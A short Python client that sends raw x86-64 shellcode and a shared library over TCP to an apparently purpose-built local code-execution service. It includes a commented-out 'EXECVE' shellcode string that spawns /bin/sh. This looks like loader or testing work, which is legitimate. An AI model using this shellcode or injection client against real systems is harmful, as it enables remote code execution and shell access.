#!/usr/bin/env python

import socket
import struct
import sys

HOST = '127.0.0.1'
PORT = 1234
CODE = {
    'WRITE_HELLO':
    	"\x48\xc7\xc0\x01\x00\x00\x00\x48\xc7\xc7\x01\x00\x00\x00\x48\xbe"
    	"\x68\x65\x6c\x6c\x6f\x0a\x00\x00\x56\x48\x89\xe6\x48\xc7\xc2\x06"
    	"\x00\x00\x00\x0f\x05\x48\xc7\xc0\x3c\x00\x00\x00\x48\x31\xff\x0f"
    	"\x05",
    'EXECVE':
    	"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53"
    	"\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05",
}

def run(host, port, op, data):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    size = struct.pack('<I', len(data))
    s.sendall(op + size + data)
    while True:
        data = s.recv(1024)
        if not data:
            break
        sys.stdout.write(data)
    s.close()

def run_code(host, port, code):
    run(host, port, '0', code)

def run_lib(host, port, path):
    with open(path) as fp:
        data = fp.read()
    run(host, port, '1', data)

if __name__ == '__main__':
    run_code(HOST, PORT, CODE['WRITE_HELLO'])
    run_lib(HOST, PORT, 'libexample.so')
    #run_code(HOST, PORT, CODE['EXECVE'])
